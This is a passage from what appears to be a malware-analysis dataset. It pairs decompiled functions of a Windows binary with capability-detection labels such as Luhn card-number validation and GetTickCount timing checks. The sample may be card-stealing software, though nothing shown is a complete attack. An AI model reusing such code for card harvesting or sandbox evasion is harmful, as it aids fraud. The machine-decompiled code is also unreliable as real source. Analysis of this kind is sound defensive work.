0) {\n        arg_8h[5] = 0xf;\n        arg_8h[4] = NULL;\n        *arg_8h = 0;\n        arg_10h = fcn.0042ad20(0);\n        if (arg_10h == 0xffffffff) {\n            fcn.00429b7e(0x4452ec);\n        }\n        if (arg_8h[5] < arg_10h) {\n            fcn.00405ba0(arg_10h, arg_8h[4]);\n        }\n        else if (arg_10h == NULL) {\n            arg_8h[4] = NULL;\n            if (0xf < arg_8h[5]) {\n                arg_8h = *arg_8h;\n            }\n            *arg_8h = 0;\n            goto code_r0x0041fe56;\n        }\n        if (arg_10h != NULL) {\n            ppuVar7 = arg_8h;\n            if (0xf < arg_8h[5]) {\n                ppuVar7 = *arg_8h;\n            }\n            fcn.0042a840(ppuVar7, 0, arg_10h);\n            arg_8h[4] = arg_10h;\n            if (arg_8h[5] < 0x10) {\n                *(arg_8h + arg_10h) = 0;\n            }\n            else {\n                (*arg_8h)[arg_10h] = 0;\n            }\n        }\n    }\n    else {\n        (**0x462e8c)(iVar4, 0x447d90, var_140h, var_13ch & 0xffff, CONCAT22(var_136h._2_2_, var_136h));\n        uVar5 = fcn.0042ad20(iVar4);\n        fcn.0040bb30(iVar4, uVar5);\n        if (var_11ch < 0x10) {\n            var_1e8h = &var_130h;\n        }\n        else {\n            var_1e8h = var_130h;\n        }\n        puVar8 = var_1e8h + var_120h;\n        puVar9 = var_130h;\n        if (var_11ch < 0x10) {\n            puVar9 = &var_130h;\n        }\n        if (puVar9 != puVar8) {\n            iVar4 = var_1e8h - puVar9;\n            do {\n                uVar2 = fcn.0042e403(*puVar9);\n                *(puVar9 + iVar4) = uVar2;\n                puVar9 = puVar9 + 1;\n            } while (puVar9 != puVar8);\n        }\n        fcn.0041f930(&var_1d8h);\n        puVar9 = &var_1bch;\n        var_4h._0_1_ = 1;\n        uVar5 = fcn.0040e6b0(puVar9, 0x14, 0x11);\n        var_4h._0_1_ = 2;\n        fcn.0041f9b0(&var_1a0h);\n        var_4h._0_1_ = 3;\n        uVar6 = fcn.0040e6b0(&var_184h, 0, 0x18);\n        var_4h._0_1_ = 4;\n        uVar6 = fcn.0041fc80(&var_168h, &var_130h, uVar6);\n        var_4h = CONCAT31(var_4h._1_3_, 5);\n        ppuVar7 = fcn.004064e0(&var_14ch, uVar6, uVar5);\n        if (&var_130h != ppuVar7) {\n            if (0xf < var_11ch) {\n                fcn.0042a679(var_130h);\n            }\n            var_11ch = 0xf;\n            var_120h = NULL;\n            var_130h = var_130h & 0xffffff00;\n            if (ppuVar7[5] < 0x10) {\n                fcn.0042adb0(&var_130h, ppuVar7, ppuVar7[4] + 1);\n            }\n            else {\n                var_130h = *ppuVar7;\n                *ppuVar7 = NULL;\n            }\n            var_120h = ppuVar7[4];\n            var_11ch = ppuVar7[5];\n            ppuVar7[4] = NULL;\n            ppuVar7[5] = NULL;\n        }\n        if (0xf < CONCAT22(var_136h, var_138h)) {\n            fcn.0042a679(var_14ch);\n        }\n        var_138h = 0xf;\n        var_136h._0_2_ = 0;\n        var_13ch = 0;\n        var_14ch = var_14ch & 0xffffff00;\n        if (0xf < var_154h) {\n            fcn.0042a679(var_168h);\n        }\n        var_154h = 0xf;\n        var_158h = 0;\n        var_168h = var_168h & 0xffffff00;\n        if (0xf < var_170h) {\n            fcn.0042a679(var_184h);\n        }\n        var_170h = 0xf;\n        var_174h = 0;\n        var_184h = var_184h & 0xffffff00;\n        if (0xf < var_18ch) {\n            fcn.0042a679(var_1a0h);\n        }\n        var_18ch = 0xf;\n        var_190h = 0;\n        var_1a0h = var_1a0h & 0xffffff00;\n        if (0xf < var_1a8h) {\n            fcn.0042a679(var_1bch);\n        }\n        var_1a8h = 0xf;\n        var_1ach = 0;\n        var_1bch = var_1bch & 0xffffff00;\n        if (0xf < var_1c4h) {\n            fcn.0042a679(var_1d8h);\n        }\n        arg_8h[5] = 0xf;\n        arg_8h[4] = NULL;\n        *arg_8h = 0;\n        if (arg_8h != &var_130h) {\n            if (0xf < arg_8h[5]) {\n                fcn.0042a679(*arg_8h);\n            }\n            arg_8h[5] = 0xf;\n            arg_8h[4] = NULL;\n            *arg_8h = 0;\n            if (var_11ch < 0x10) {\n                fcn.0042adb0(arg_8h, &var_130h, var_120h + 1);\n                arg_8h[4] = var_120h;\n                arg_8h[5] = var_11ch;\n            }\n            else {\n                *arg_8h = var_130h;\n                arg_8h[4] = var_120h;\n                arg_8h[5] = var_11ch;\n            }\n            goto code_r0x0041fe6e;\n        }\n    }\ncode_r0x0041fe56:\n    if (0xf < var_11ch) {\n        fcn.0042a679(var_130h);\n    }\ncode_r0x0041fe6e:\n    *in_FS_OFFSET = var_ch;\n    fcn.0042a75a(puVar9);\n    return;\n}\n",
        "token_count": 2569
    },
    "004201f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004201f0(uint arg_8h)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint arg_ch;\n    int32_t *in_FS_OFFSET;\n    uint arg_8h_00;\n    uint var_8ch;\n    uint var_88h;\n    uint var_80h;\n    uint32_t var_6ch;\n    uint32_t var_64h;\n    uint var_54h;\n    uint32_t var_50h;\n    uint32_t var_48h;\n    uint var_38h;\n    uint32_t var_34h;\n    uint32_t var_2ch;\n    uint var_1ch;\n    uint32_t var_18h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43ecc0;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x4506f0 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    uVar1 = (**0x462fec)(0x440210, 0, 0, 0, var_10h);\n    uVar2 = (**0x462f80)(uVar1, 8);\n    arg_ch = (**0x462f80)(uVar1, 10);\n    arg_8h_00 = 0;\n    (**0x46303c)(0, uVar1);\n    uVar1 = fcn.00423fe0(&var_80h, arg_ch);\n    var_4h = 0;\n    uVar2 = fcn.00423fe0(&var_64h, uVar2);\n    var_4h._0_1_ = 1;\n    uVar2 = fcn.00406490(&var_48h, 0x4452bc, uVar2);\n    var_4h._0_1_ = 2;\n    uVar2 = fcn.0040e6f0(&var_2ch, uVar2, 0x447da0);\n    var_4h = CONCAT31(var_4h._1_3_, 3);\n    fcn.004064e0(arg_8h, uVar2, uVar1);\n    if (0xf < var_18h) {\n        fcn.0042a679(var_2ch);\n    }\n    var_18h = 0xf;\n    var_1ch = 0;\n    var_2ch = var_2ch & 0xffffff00;\n    if (0xf < var_34h) {\n        fcn.0042a679(var_48h);\n    }\n    var_34h = 0xf;\n    var_38h = 0;\n    var_48h = var_48h & 0xffffff00;\n    if (0xf < var_50h) {\n        fcn.0042a679(var_64h);\n    }\n    var_50h = 0xf;\n    var_54h = 0;\n    var_64h = var_64h & 0xffffff00;\n    if (0xf < var_6ch) {\n        fcn.0042a679(var_80h);\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0042a75a(arg_8h_00);\n    return;\n}\n",
        "token_count": 773
    },
    "00420360": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00420360(uchar *arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t *in_FS_OFFSET;\n    ushort *arg_8h_00;\n    uint var_118h;\n    uint32_t var_110h;\n    uint var_100h;\n    uint32_t var_fch;\n    uint32_t var_f4h;\n    uint var_e4h;\n    uint32_t var_e0h;\n    uint32_t var_d8h;\n    uint var_c8h;\n    uint32_t var_c4h;\n    ushort var_bch;\n    uint var_bah;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint32_t var_4h;\n    \n    uStack12 = 0x43ed11;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x4506f0 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_c4h = 0xf;\n    var_c8h = 0;\n    var_d8h = var_d8h & 0xffffff00;\n    var_4h = 0;\n    var_bch = 0;\n    fcn.0042a6e0(&var_bah, 0, 0xa8, var_10h);\n    iVar1 = (**0x462f2c)(&var_bch, 0x55);\n    if (iVar1 == 0) {\n        *(arg_8h + 0x14) = 0xf;\n        *(arg_8h + 0x10) = 0;\n        *arg_8h = 0;\n        uVar2 = fcn.0042ad20(0x447bf4);\n        arg_8h_00 = 0x447bf4;\n        fcn.004062a0(0x447bf4, uVar2);\n    }\n    else {\n        var_e0h = 7;\n        var_e4h = 0;\n        var_f4h = var_f4h & 0xffff0000;\n        uVar2 = fcn.0042e2d3(&var_bch);\n        arg_8h_00 = &var_bch;\n        fcn.0041f740(arg_8h_00, uVar2);\n        var_4h._0_1_ = 1;\n        uVar2 = fcn.00423cb0(&var_110h, &var_f4h);\n        var_4h = CONCAT31(var_4h._1_3_, 2);\n        fcn.004063e0(uVar2);\n        if (0xf < var_fch) {\n            fcn.0042a679(var_110h);\n        }\n        var_fch = 0xf;\n        var_100h = 0;\n        var_110h = var_110h & 0xffffff00;\n        var_4h = var_4h & 0xffffff00;\n        if (7 < var_e0h) {\n            fcn.0042a679(var_f4h);\n        }\n        *(arg_8h + 0x14) = 0xf;\n        *(arg_8h + 0x10) = 0;\n        *arg_8h = 0;\n        fcn.004063e0(&var_d8h);\n    }\n    if (0xf < var_c4h) {\n        fcn.0042a679(var_d8h);\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0042a75a(arg_8h_00);\n    return;\n}\n",
        "token_count": 823
    },
    "00420510": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00420510(uint arg_8h)\n\n{\n    uint arg_10h;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h_00;\n    uint var_100h;\n    int32_t var_f8h;\n    uint var_4ch;\n    uint32_t var_38h;\n    uint var_30h;\n    uint var_2ah;\n    uint var_26h;\n    ushort var_22h;\n    uint var_20h;\n    uint var_1ah;\n    uint var_16h;\n    ushort var_12h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43ed48;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x4506f0 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_20h._0_2_ = 0;\n    stack0xffffffde = 0;\n    var_1ah = 0;\n    var_16h = 0;\n    var_12h = 0;\n    (**0x462fd4)(&var_20h, var_10h);\n    (**0x4630c8)(&var_f8h);\n    var_30h._0_2_ = 0;\n    stack0xffffffce = 0;\n    var_2ah = 0;\n    var_26h = 0;\n    var_22h = 0;\n    arg_8h_00 = &var_f8h;\n    (**0x4630e8)(arg_8h_00, &var_20h, &var_30h);\n    arg_10h = fcn.00424180(&var_4ch, -(var_f8h / *0x447da8));\n    var_4h = 0;\n    fcn.00406490(arg_8h, 0x447da4, arg_10h);\n    if (0xf < var_38h) {\n        fcn.0042a679(var_4ch);\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0042a75a(arg_8h_00);\n    return;\n}\n",
        "token_count": 528
    },
    "00420610": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00420610(uchar *arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h_00;\n    uint var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    uint var_2ch;\n    uint32_t var_18h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint32_t var_4h;\n    \n    uStack12 = 0x43ed99;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x4506f0 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    *(arg_8h + 0x14) = 0xf;\n    *(arg_8h + 0x10) = 0;\n    var_4h = 0;\n    *arg_8h = 0;\n    uVar1 = fcn.0042ad20(0x4452bc, var_10h);\n    fcn.004062a0(0x4452bc, uVar1);\n    var_4h = 0;\n    uVar1 = fcn.0042ad20(0x447ddc);\n    fcn.004062a0(0x447ddc, uVar1);\n    arg_8h_00 = &var_30h;\n    var_30h = 0;\n    uVar1 = (**0x4630b4)();\n    iVar2 = (**0x463058)(uVar1);\n    if ((iVar2 == 0) || (uVar1 = 0x447c3c,  var_30h == 0)) {\n        uVar1 = 0x447c38;\n    }\n    uVar1 = fcn.0040e740(&var_2ch, arg_8h, uVar1);\n    var_4h = 1;\n    fcn.004063e0(uVar1);\n    var_4h = var_4h & 0xffffff00;\n    if (0xf < var_18h) {\n        fcn.0042a679(var_2ch);\n    }\n    uVar1 = fcn.0040e740(&var_2ch, arg_8h, 0x447db0);\n    var_4h = 2;\n    fcn.004063e0(uVar1);\n    if (0xf < var_18h) {\n        fcn.0042a679(var_2ch);\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0042a75a(arg_8h_00);\n    return;\n}\n",
        "token_count": 610
    },
    "00420810": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00420810(int32_t *arg_8h)\n\n{\n    *arg_8h = *arg_8h * 0x14a30b + -0x69427551;\n    return;\n}\n",
        "token_count": 52
    },
    "00420830": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00420830(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uchar *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = (**0x462eb8)(arg_8h, arg_ch);\n    if (iVar2 == 0) {\n        return arg_8h;\n    }\n    (**0x462fb0)(0x462658, arg_8h, iVar2 - arg_8h);\n    puVar1 = (iVar2 - arg_8h) + 0x462658;\n    *puVar1 = 0;\n    iVar3 = fcn.0042ad20(arg_ch);\n    (**0x462e8c)(puVar1, 0x446d24, arg_10h, iVar3 + iVar2);\n    return 0x462658;\n}\n",
        "token_count": 201
    },
    "00420910": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.00420910(int32_t arg_8h)\n\n{\n    uchar *puVar1;\n    uint arg_8h_00;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    puVar1 = fcn.0042a769(arg_8h);\n    *puVar1 = 0;\n    arg_8h_00 = (**0x4630a4)();\n    fcn.0042e4be(arg_8h_00);\n    iVar3 = arg_8h;\n    if (arg_8h < 1) {\n        *puVar1 = 0;\n        return puVar1;\n    }\n    do {\n        iVar2 = fcn.0042e4d0();\n        (**0x462e8c)(puVar1, \"incomplete literal/length tree\", puVar1, iVar2 % 10);\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    puVar1[arg_8h] = 0;\n    return puVar1;\n}\n",
        "token_count": 235
    },
    "00420a40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00420a40(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    uint var_3ech;\n    uint32_t var_4h;\n    \n    var_4h = *0x4506f0 ^ &stack0xfffffffc;\n    fcn.0042a6e0(&var_3ech, 0, 1000);\n    arg_8h_00 = 0;\n    (**0x463018)(0, arg_8h, 0, 0, &var_3ech);\n    fcn.0042a75a(arg_8h_00);\n    return;\n}\n",
        "token_count": 144
    },
    "00420aa0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00420aa0(uint arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint32_t uVar4;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    uVar4 = 0;\n    var_4h = 0;\n    var_8h = 0;\n    (**0x462efc)(&var_4h, &var_8h);\n    iVar2 = var_8h;\n    if (var_8h == 0) {\n        return 0xffffffff;\n    }\n    iVar1 = fcn.0042a769(var_8h);\n    if (iVar1 != 0) {\n        (**0x462f4c)(var_4h, iVar2, iVar1);\n        if (var_4h != 0) {\n            puVar3 = iVar1 + 0x30;\n            do {\n                iVar2 = (**0x462ffc)(*puVar3, arg_8h);\n                if (iVar2 == 0) {\n                    iVar2 = uVar4 * 0x4c + iVar1;\n                    *arg_ch = *(uVar4 * 0x4c + iVar1);\n                    arg_ch[1] = *(iVar2 + 4);\n                    arg_ch[2] = *(iVar2 + 8);\n                    arg_ch[3] = *(iVar2 + 0xc);\n                    fcn.0042a6e0(iVar1, 0, 0);\n                    return uVar4;\n                }\n                uVar4 = uVar4 + 1;\n                puVar3 = puVar3 + 0x13;\n            } while (uVar4 < var_4h);\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 408
    },
    "00420cf0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00420cf0(uint arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *arg_8h_00;\n    uint arg_8h_01;\n    uint var_12ch;\n    uint var_108h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4506f0 ^ &stack0xfffffffc;\n    var_12ch = 0x128;\n    uVar1 = fcn.00429b56(2, 0);\n    arg_8h_01 = uVar1;\n    iVar2 = fcn.00429b50(uVar1, &var_12ch);\n    if (iVar2 != 0) {\n        iVar2 = fcn.00429b4a(uVar1, &var_12ch);\n        while (iVar2 != 0) {\n            arg_8h_00 = &var_108h;\n            fcn.0043b15f(arg_8h_00, arg_8h);\n            iVar2 = fcn.00429b4a(arg_8h_00, &var_12ch, uVar1);\n        }\n    }\n    (**0x440030)(uVar1);\n    fcn.0042a75a(arg_8h_01);\n    return;\n}\n",
        "token_count": 297
    },
    "004212d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004212d0(uint noname_0, uchar *arg_ch, char *arg_10h, uint32_t arg_14h)\n\n{\n    ushort *puVar1;\n    uint8_t *puVar2;\n    \n    *arg_ch = 0x25;\n    puVar1 = arg_ch + 1;\n    if ((arg_14h & 0x20) != 0) {\n        *puVar1 = 0x2b;\n        puVar1 = arg_ch + 2;\n    }\n    if ((arg_14h & 8) != 0) {\n        *puVar1 = 0x23;\n        puVar1 = puVar1 + 1;\n    }\n    if (*arg_10h == 'L') {\n        *puVar1 = 0x3649;\n        *(puVar1 + 1) = 0x34;\n        puVar2 = puVar1 + 3;\n    }\n    else {\n        *puVar1 = *arg_10h;\n        puVar2 = puVar1 + 1;\n    }\n    if ((arg_14h & 0xe00) == 0x400) {\n        *puVar2 = 0x6f;\n        puVar2[1] = 0;\n        return;\n    }\n    if ((arg_14h & 0xe00) != 0x800) {\n        *puVar2 = arg_10h[1];\n        puVar2[1] = 0;\n        return;\n    }\n    *puVar2 = ~(arg_14h * '\\b') & 0x20U | 0x58;\n    puVar2[1] = 0;\n    return;\n}\n",
        "token_count": 381
    },
    "00421360": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00421360(int32_t param_1)\n\n{\n    fcn.0042bc28(*(param_1 + 8));\n    fcn.0042bc28(*(param_1 + 0x10));\n    fcn.0042bc28(*(param_1 + 0x14));\n    return;\n}\n",
        "token_count": 74
    },
    "004214d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004214d0(int32_t *param_1)\n\n{\n    int32_t *arg_8h;\n    uint32_t uVar1;\n    int32_t *in_FS_OFFSET;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x43edeb;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x4506f0 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    arg_8h = param_1 + 0x14;\n    *(*(*param_1 + 4) + -0x50 + arg_8h) = 0x447fcc;\n    var_4h = 0;\n    param_1[1] = 0x447f8c;\n    fcn.00420dd0(uVar1);\n    fcn.00418650();\n    *(*(*param_1 + 4) + -0x50 + arg_8h) = 0x447f78;\n    var_4h = 0xffffffff;\n    *arg_8h = 0x447298;\n    fcn.0042a309(arg_8h);\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 291
    },
    "00421930": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __cdecl\nfcn.00421930(uint arg_8h, uint *arg_ch, uint arg_10h, uint arg_14h, int32_t arg_18h, int32_t arg_1ch, uint arg_20h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t arg_1ch_00;\n    uint var_10h;\n    uint var_8h;\n    \n    while( true ) {\n        iVar2 = fcn.0042d1c0(arg_18h, 0, arg_1ch);\n        arg_1ch_00 = arg_1ch;\n        if (iVar2 != 0) {\n            arg_1ch_00 = iVar2 - arg_18h;\n        }\n        puVar3 = fcn.00421850(arg_8h, &var_8h, arg_10h, arg_14h, arg_18h, arg_1ch_00);\n        arg_10h = *puVar3;\n        arg_14h = puVar3[1];\n        if (arg_1ch - arg_1ch_00 == 0) break;\n        if (arg_20h != '\\0') {\n            puVar3 = fcn.004218c0(arg_8h, &var_10h, *puVar3, puVar3[1], arg_20h, 1);\n            arg_10h = *puVar3;\n            arg_14h = puVar3[1];\n        }\n        arg_18h = arg_18h + arg_1ch_00 + 1;\n        arg_1ch = (arg_1ch - arg_1ch_00) + -1;\n    }\n    uVar1 = *puVar3;\n    arg_ch[1] = puVar3[1];\n    *arg_ch = uVar1;\n    return arg_ch;\n}\n",
        "token_count": 426
    },
    "00421ea0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00421ea0(int32_t *arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t **ppiVar2;\n    int32_t *piVar3;\n    int32_t **ppiVar4;\n    int32_t **in_ECX;\n    uint32_t extraout_ECX;\n    uint32_t uVar5;\n    \n    piVar3 = in_ECX[4];\n    if (piVar3 < arg_8h) {\n        piVar3 = fcn.00429bcb(0x4452c0);\n    }\n    uVar5 = arg_ch;\n    if (-piVar3 - 1U <= arg_ch) {\n        piVar3 = fcn.00429b7e(0x4452ec);\n        uVar5 = extraout_ECX;\n    }\n    if (uVar5 != 0) {\n        piVar1 = piVar3 + uVar5;\n        if (piVar1 == 0xffffffff) {\n            piVar3 = fcn.00429b7e(0x4452ec);\n        }\n        if (in_ECX[5] < piVar1) {\n            fcn.00405ba0(piVar1, piVar3);\n            if (piVar1 == NULL) {\n                return;\n            }\n        }\n        else if (piVar1 == NULL) {\n            in_ECX[4] = NULL;\n            if (in_ECX[5] < 0x10) {\n                *in_ECX = 0;\n                return;\n            }\n            **in_ECX = 0;\n            return;\n        }\n        ppiVar4 = in_ECX;\n        ppiVar2 = in_ECX;\n        if (0xf < in_ECX[5]) {\n            ppiVar4 = *in_ECX;\n            ppiVar2 = *in_ECX;\n        }\n        fcn.0042adb0(ppiVar4 + arg_8h + arg_ch, ppiVar2 + arg_8h, in_ECX[4] - arg_8h);\n        fcn.0040b910(arg_8h, arg_ch, arg_10h);\n        in_ECX[4] = piVar1;\n        if (0xf < in_ECX[5]) {\n            *(*in_ECX + piVar1) = 0;\n            return;\n        }\n        *(in_ECX + piVar1) = 0;\n    }\n    return;\n}\n",
        "token_count": 552
    },
    "004224c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.004224c0(int32_t *param_1, uint param_2, uint param_3, uint param_4)\n\n{\n    uint32_t *puVar1;\n    int32_t *piVar2;\n    uint32_t uVar3;\n    char cVar4;\n    int32_t *in_FS_OFFSET;\n    int64_t iVar5;\n    uint var_8h;\n    uint var_ch_3;\n    uint var_10h_2;\n    uint var_10h;\n    uint var_ch;\n    uint var_20h;\n    uint var_1ch;\n    uint32_t var_18h;\n    uint var_14h;\n    int32_t var_ch_2;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43ef70;\n    var_ch_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch_2;\n    param_1[2] = 0;\n    param_1[3] = 0;\n    piVar2 = *(*(*param_1 + 4) + 0x38 + param_1);\n    var_18h = 0;\n    if (piVar2 != NULL) {\n        (**(*piVar2 + 4))();\n    }\n    var_4h = 0;\n    cVar4 = fcn.004191f0(1);\n    if (cVar4 != '\\0') {\n        var_4h = 2;\n        iVar5 = (**(**(*(*param_1 + 4) + 0x38 + param_1) + 0x20))(var_8h, var_ch_3, var_10h_2);\n        puVar1 = param_1 + 2;\n        uVar3 = *puVar1;\n        *puVar1 = *puVar1 + iVar5;\n        param_1[3] = param_1[3] + (iVar5 >> 0x20) + CARRY4(uVar3, iVar5);\n        if (iVar5 != CONCAT44(var_10h_2, var_ch_3)) {\n            var_18h = 3;\n        }\n    }\n    var_4h = 1;\n    if (var_18h != 0) {\n        var_18h = *(param_1 + *(*param_1 + 4) + 0xc) | var_18h;\n        if (*(param_1 + *(*param_1 + 4) + 0x38) == 0) {\n            var_18h = var_18h | 4;\n        }\n        fcn.00418440(var_18h, 0);\n    }\n    piVar2 = *(*(*param_1 + 4) + 0x38 + param_1);\n    var_4h = 0xffffffff;\n    if (piVar2 != NULL) {\n        (**(*piVar2 + 8))();\n    }\n    *in_FS_OFFSET = var_ch_2;\n    return param_1;\n}\n",
        "token_count": 680
    },
    "00423130": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4ch\n\nvoid __cdecl fcn.00423130(uint arg_8h, uint arg_ch, uint arg_10h, int32_t arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint uVar1;\n    uint in_ECX;\n    uint var_4ch;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x4506f0 ^ &stack0xfffffffc;\n    uVar1 = fcn.004212d0(in_ECX, &var_ch, 0x44802c, *(arg_14h + 0x14));\n    uVar1 = fcn.0042e5b9(&var_4ch, 0x40, uVar1, arg_1ch);\n    fcn.00422b80(in_ECX, arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, &var_4ch, uVar1);\n    fcn.0042a75a(var_4ch);\n    return;\n}\n",
        "token_count": 252
    },
    "004231b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4ch\n\nvoid __cdecl fcn.004231b0(uint arg_8h, uint arg_ch, uint arg_10h, int32_t arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint uVar1;\n    uint in_ECX;\n    uint var_4ch;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x4506f0 ^ &stack0xfffffffc;\n    uVar1 = fcn.004212d0(in_ECX, &var_ch, \"\\\\../\", *(arg_14h + 0x14));\n    uVar1 = fcn.0042e5b9(&var_4ch, 0x40, uVar1, arg_1ch);\n    fcn.00422b80(in_ECX, arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, &var_4ch, uVar1);\n    fcn.0042a75a(var_4ch);\n    return;\n}\n",
        "token_count": 249
    },
    "00423230": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4ch\n\nvoid __cdecl\nfcn.00423230(uint arg_8h, uint arg_ch, uint arg_10h, int32_t arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    uint uVar1;\n    uint in_ECX;\n    uint var_4ch;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x4506f0 ^ &stack0xfffffffc;\n    uVar1 = fcn.004212d0(in_ECX, &var_ch, 0x448034, *(arg_14h + 0x14));\n    uVar1 = fcn.0042e5b9(&var_4ch, 0x40, uVar1, arg_1ch);\n    fcn.00422b80(in_ECX, arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, &var_4ch, uVar1);\n    fcn.0042a75a(var_4ch);\n    return;\n}\n",
        "token_count": 257
    },
    "004232b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
